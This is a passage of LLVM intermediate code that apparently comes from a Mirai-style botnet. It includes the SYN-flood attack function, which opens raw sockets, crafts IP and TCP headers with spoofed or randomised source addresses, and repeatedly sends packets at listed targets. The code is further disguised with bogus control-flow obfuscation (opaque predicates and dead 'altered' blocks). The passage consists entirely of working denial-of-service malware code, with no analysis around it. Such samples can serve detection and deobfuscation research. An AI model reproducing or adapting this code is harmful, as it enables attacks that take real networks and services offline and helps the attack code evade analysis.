  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %378

; <label>:378:                                    ; preds = %originalBBpart244
  %379 = load i32, i32* %9, align 4
  %380 = add nsw i32 %379, 1
  store i32 %380, i32* %9, align 4
  br label %303

; <label>:381:                                    ; preds = %originalBBpart236
  %382 = load i32, i32* @x.23
  %383 = load i32, i32* @y.24
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %381
  %390 = load i32, i32* @x.23
  %391 = load i32, i32* @y.24
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %302

originalBBalteredBB:                              ; preds = %originalBB, %51
  %398 = call i32 @rand_next()
  %399 = trunc i32 %398 to i16
  store i16 %399, i16* %13, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %400 = load i16, i16* %13, align 2
  %401 = call zeroext i16 @htons(i16 zeroext %400) #7
  store i16 %401, i16* %13, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %89
  store i32 0, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %129
  %402 = load i16, i16* %12, align 2
  %403 = call zeroext i16 @htons(i16 zeroext %402) #7
  %404 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %405 = load i32, i32* %9, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i64 %406
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i32 0, i32 0
  %409 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %408, i32 0, i32 1
  store i16 %403, i16* %409, align 2
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %154
  %410 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %411 = load i32*, i32** %11, align 8
  %412 = load i32, i32* %9, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds i32, i32* %411, i64 %413
  store i32 %410, i32* %414, align 4
  %415 = icmp eq i32 %410, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %177
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %212
  %416 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %417 = load i32, i32* %9, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %416, i64 %418
  %420 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %419, i32 0, i32 2
  %421 = load i8, i8* %420, align 4
  %422 = zext i8 %421 to i32
  %423 = icmp slt i32 %422, 32
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %282
  %424 = load i32, i32* %9, align 4
  %_ = sub i32 %424, 1
  %gen = mul i32 %_, 1
  %_27 = sub i32 0, %424
  %gen28 = add i32 %_27, 1
  %_29 = sub i32 0, %424
  %gen30 = add i32 %_29, 1
  %425 = add nsw i32 %424, 1
  store i32 %425, i32* %9, align 4
  br label %originalBB26

originalBB34alteredBB:                            ; preds = %originalBB34, %303
  %426 = load i32, i32* %9, align 4
  %427 = load i8, i8* %5, align 1
  %428 = zext i8 %427 to i32
  %429 = icmp slt i32 %426, %428
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %324
  %430 = load i8**, i8*** %10, align 8
  %431 = load i32, i32* %9, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds i8*, i8** %430, i64 %432
  %434 = load i8*, i8** %433, align 8
  store i8* %434, i8** %22, align 8
  %435 = load i8, i8* %15, align 1
  %436 = icmp ne i8 %435, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %352
  %437 = load i32*, i32** %11, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds i32, i32* %437, i64 %439
  %441 = load i32, i32* %440, align 4
  %442 = load i8*, i8** %22, align 8
  %443 = load i16, i16* %14, align 2
  %444 = zext i16 %443 to i64
  %445 = call i64 @send(i32 %441, i8* %442, i64 %444, i32 16384)
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %381
  br label %originalBB46
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %629

; <label>:99:                                     ; preds = %4
  %100 = load i32, i32* @x.25
  %101 = load i32, i32* @y.26
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %99
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  %112 = load i32, i32* @x.25
  %113 = load i32, i32* @y.26
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %111, label %120, label %123

; <label>:120:                                    ; preds = %originalBBpart2
  %121 = load i32, i32* %10, align 4
  %122 = call i32 @close(i32 %121)
  br label %629

; <label>:123:                                    ; preds = %originalBBpart2
  %124 = load i32, i32* @x.25
  %125 = load i32, i32* @y.26
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %123
  store i32 0, i32* %9, align 4
  %132 = load i32, i32* @x.25
  %133 = load i32, i32* @y.26
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %140

; <label>:140:                                    ; preds = %333, %originalBBpart24
  %141 = load i32, i32* %9, align 4
  %142 = load i8, i8* %5, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp slt i32 %141, %143
  br i1 %144, label %145, label %336

; <label>:145:                                    ; preds = %140
  %146 = load i32, i32* @x.25
  %147 = load i32, i32* @y.26
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %145
  %154 = call noalias i8* @calloc(i64 128, i64 1) #6
  %155 = load i8**, i8*** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i8*, i8** %155, i64 %157
  store i8* %154, i8** %158, align 8
  %159 = load i8**, i8*** %11, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  %163 = load i8*, i8** %162, align 8
  %164 = bitcast i8* %163 to %struct.iphdr*
  store %struct.iphdr* %164, %struct.iphdr** %27, align 8
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i64 1
  %167 = bitcast %struct.iphdr* %166 to %struct.tcphdr*
  store %struct.tcphdr* %167, %struct.tcphdr** %28, align 8
  %168 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %169 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %168, i64 1
  %170 = bitcast %struct.tcphdr* %169 to i8*
  store i8* %170, i8** %29, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = load i8, i8* %172, align 4
  %174 = and i8 %173, 15
  %175 = or i8 %174, 64
  store i8 %175, i8* %172, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, -16
  %180 = or i8 %179, 5
  store i8 %180, i8* %177, align 4
  %181 = load i8, i8* %12, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 1
  store i8 %181, i8* %183, align 1
  %184 = call zeroext i16 @htons(i16 zeroext 60) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 2
  store i16 %184, i16* %186, align 2
  %187 = load i16, i16* %13, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = load i32, i32* @x.25
  %197 = load i32, i32* @y.26
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart229, label %originalBB6alteredBB

originalBBpart229:                                ; preds = %originalBB6
  br i1 %195, label %204, label %208

; <label>:204:                                    ; preds = %originalBBpart229
  %205 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %206 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 4
  store i16 %205, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %204, %originalBBpart229
  %209 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 6
  store i8 6, i8* %210, align 1
  %211 = load i32, i32* %26, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 8
  store i32 %211, i32* %213, align 4
  %214 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i32 0, i32 1
  %219 = load i32, i32* %218, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  %222 = load i16, i16* %16, align 2
  %223 = call zeroext i16 @htons(i16 zeroext %222) #7
  %224 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 0
  store i16 %223, i16* %225, align 4
  %226 = load i16, i16* %17, align 2
  %227 = call zeroext i16 @htons(i16 zeroext %226) #7
  %228 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 1
  store i16 %227, i16* %229, align 2
  %230 = load i32, i32* %18, align 4
  %231 = trunc i32 %230 to i16
  %232 = call zeroext i16 @htons(i16 zeroext %231) #7
  %233 = zext i16 %232 to i32
  %234 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 2
  store i32 %233, i32* %235, align 4
  %236 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %238, -241
  %240 = or i16 %239, 160
  store i16 %240, i16* %237, align 4
  %241 = load i8, i8* %20, align 1
  %242 = sext i8 %241 to i16
  %243 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = and i16 %242, 1
  %247 = shl i16 %246, 13
  %248 = and i16 %245, -8193
  %249 = or i16 %248, %247
  store i16 %249, i16* %244, align 4
  %250 = load i8, i8* %21, align 1
  %251 = sext i8 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %251, 1
  %256 = shl i16 %255, 12
  %257 = and i16 %254, -4097
  %258 = or i16 %257, %256
  store i16 %258, i16* %253, align 4
  %259 = load i8, i8* %22, align 1
  %260 = sext i8 %259 to i16
  %261 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 4
  %263 = load i16, i16* %262, align 4
  %264 = and i16 %260, 1
  %265 = shl i16 %264, 11
  %266 = and i16 %263, -2049
  %267 = or i16 %266, %265
  store i16 %267, i16* %262, align 4
  %268 = load i8, i8* %23, align 1
  %269 = sext i8 %268 to i16
  %270 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 4
  %272 = load i16, i16* %271, align 4
  %273 = and i16 %269, 1
  %274 = shl i16 %273, 10
  %275 = and i16 %272, -1025
  %276 = or i16 %275, %274
  store i16 %276, i16* %271, align 4
  %277 = load i8, i8* %24, align 1
  %278 = sext i8 %277 to i16
  %279 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %280 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %279, i32 0, i32 4
  %281 = load i16, i16* %280, align 4
  %282 = and i16 %278, 1
  %283 = shl i16 %282, 9
  %284 = and i16 %281, -513
  %285 = or i16 %284, %283
  store i16 %285, i16* %280, align 4
  %286 = load i8, i8* %25, align 1
  %287 = sext i8 %286 to i16
  %288 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %289 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %288, i32 0, i32 4
  %290 = load i16, i16* %289, align 4
  %291 = and i16 %287, 1
  %292 = shl i16 %291, 8
  %293 = and i16 %290, -257
  %294 = or i16 %293, %292
  store i16 %294, i16* %289, align 4
  %295 = load i8*, i8** %29, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %29, align 8
  store i8 2, i8* %295, align 1
  %297 = load i8*, i8** %29, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %29, align 8
  store i8 4, i8* %297, align 1
  %299 = call i32 @rand_next()
  %300 = and i32 %299, 15
  %301 = add i32 1400, %300
  %302 = trunc i32 %301 to i16
  %303 = call zeroext i16 @htons(i16 zeroext %302) #7
  %304 = load i8*, i8** %29, align 8
  %305 = bitcast i8* %304 to i16*
  store i16 %303, i16* %305, align 2
  %306 = load i8*, i8** %29, align 8
  %307 = getelementptr inbounds i8, i8* %306, i64 2
  store i8* %307, i8** %29, align 8
  %308 = load i8*, i8** %29, align 8
  %309 = getelementptr inbounds i8, i8* %308, i32 1
  store i8* %309, i8** %29, align 8
  store i8 4, i8* %308, align 1
  %310 = load i8*, i8** %29, align 8
  %311 = getelementptr inbounds i8, i8* %310, i32 1
  store i8* %311, i8** %29, align 8
  store i8 2, i8* %310, align 1
  %312 = load i8*, i8** %29, align 8
  %313 = getelementptr inbounds i8, i8* %312, i32 1
  store i8* %313, i8** %29, align 8
  store i8 8, i8* %312, align 1
  %314 = load i8*, i8** %29, align 8
  %315 = getelementptr inbounds i8, i8* %314, i32 1
  store i8* %315, i8** %29, align 8
  store i8 10, i8* %314, align 1
  %316 = call i32 @rand_next()
  %317 = load i8*, i8** %29, align 8
  %318 = bitcast i8* %317 to i32*
  store i32 %316, i32* %318, align 4
  %319 = load i8*, i8** %29, align 8
  %320 = getelementptr inbounds i8, i8* %319, i64 4
  store i8* %320, i8** %29, align 8
  %321 = load i8*, i8** %29, align 8
  %322 = bitcast i8* %321 to i32*
  store i32 0, i32* %322, align 4
  %323 = load i8*, i8** %29, align 8
  %324 = getelementptr inbounds i8, i8* %323, i64 4
  store i8* %324, i8** %29, align 8
  %325 = load i8*, i8** %29, align 8
  %326 = getelementptr inbounds i8, i8* %325, i32 1
  store i8* %326, i8** %29, align 8
  store i8 1, i8* %325, align 1
  %327 = load i8*, i8** %29, align 8
  %328 = getelementptr inbounds i8, i8* %327, i32 1
  store i8* %328, i8** %29, align 8
  store i8 3, i8* %327, align 1
  %329 = load i8*, i8** %29, align 8
  %330 = getelementptr inbounds i8, i8* %329, i32 1
  store i8* %330, i8** %29, align 8
  store i8 3, i8* %329, align 1
  %331 = load i8*, i8** %29, align 8
  %332 = getelementptr inbounds i8, i8* %331, i32 1
  store i8* %332, i8** %29, align 8
  store i8 6, i8* %331, align 1
  br label %333

; <label>:333:                                    ; preds = %208
  %334 = load i32, i32* %9, align 4
  %335 = add nsw i32 %334, 1
  store i32 %335, i32* %9, align 4
  br label %140

; <label>:336:                                    ; preds = %140
  %337 = load i32, i32* @x.25
  %338 = load i32, i32* @y.26
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %336
  %345 = load i32, i32* @x.25
  %346 = load i32, i32* @y.26
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %353

; <label>:353:                                    ; preds = %628, %originalBBpart233
  store i32 0, i32* %9, align 4
  br label %354

; <label>:354:                                    ; preds = %625, %353
  %355 = load i32, i32* %9, align 4
  %356 = load i8, i8* %5, align 1
  %357 = zext i8 %356 to i32
  %358 = icmp slt i32 %355, %357
  br i1 %358, label %359, label %628

; <label>:359:                                    ; preds = %354
  %360 = load i8**, i8*** %11, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds i8*, i8** %360, i64 %362
  %364 = load i8*, i8** %363, align 8
  store i8* %364, i8** %30, align 8
  %365 = load i8*, i8** %30, align 8
  %366 = bitcast i8* %365 to %struct.iphdr*
  store %struct.iphdr* %366, %struct.iphdr** %31, align 8
  %367 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i64 1
  %369 = bitcast %struct.iphdr* %368 to %struct.tcphdr*
  store %struct.tcphdr* %369, %struct.tcphdr** %32, align 8
  %370 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %371 = load i32, i32* %9, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i64 %372
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i32 0, i32 2
  %375 = load i8, i8* %374, align 4
  %376 = zext i8 %375 to i32
  %377 = icmp slt i32 %376, 32
  br i1 %377, label %378, label %415

; <label>:378:                                    ; preds = %359
  %379 = load i32, i32* @x.25
  %380 = load i32, i32* @y.26
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %378
  %387 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %388 = load i32, i32* %9, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i64 %389
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i32 0, i32 1
  %392 = load i32, i32* %391, align 4
  %393 = call i32 @ntohl(i32 %392) #7
  %394 = call i32 @rand_next()
  %395 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %396 = load i32, i32* %9, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 2
  %400 = load i8, i8* %399, align 4
  %401 = zext i8 %400 to i32
  %402 = lshr i32 %394, %401
  %403 = add i32 %393, %402
  %404 = call i32 @htonl(i32 %403) #7
  %405 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %406 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %405, i32 0, i32 9
  store i32 %404, i32* %406, align 4
  %407 = load i32, i32* @x.25
  %408 = load i32, i32* @y.26
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBBpart253, label %originalBB35alteredBB

originalBBpart253:                                ; preds = %originalBB35
  br label %415

; <label>:415:                                    ; preds = %originalBBpart253, %359
  %416 = load i32, i32* %26, align 4
  %417 = icmp eq i32 %416, -1
  br i1 %417, label %418, label %438

; <label>:418:                                    ; preds = %415
  %419 = load i32, i32* @x.25
  %420 = load i32, i32* @y.26
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %418
  %427 = call i32 @rand_next()
  %428 = load %struct.iphdr*, %struct.iphdr** %31, align 8
